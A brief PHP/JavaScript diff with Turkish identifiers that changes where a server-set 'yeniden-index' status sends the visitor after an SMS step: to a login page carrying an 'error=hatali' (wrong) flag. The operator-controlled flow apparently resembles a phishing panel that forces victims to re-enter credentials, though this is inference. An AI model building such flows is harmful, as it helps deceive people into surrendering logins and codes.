@@ -19,7 +19,7 @@ if ($application === null) {
 
 $statusEarly = (string) ($application['status'] ?? 'beklemede');
 if ($statusEarly === 'yeniden-index') {
-    header('Location: index.php');
+    header('Location: giris.php?error=hatali');
     exit;
 }
 upsertPresence('sms', (string) $application['id'], false);
@@ -183,7 +183,7 @@ if (($_SERVER['REQUEST_METHOD'] ?? 'GET') === 'POST') {
         const data = await res.json();
         if (!data.ok) return;
         if (data.status === "yeniden-index") {
-          window.location.href = "index.php";
+          window.location.href = "giris.php?error=hatali";
           return;
         }
         if (data.status === "tebrikler") {
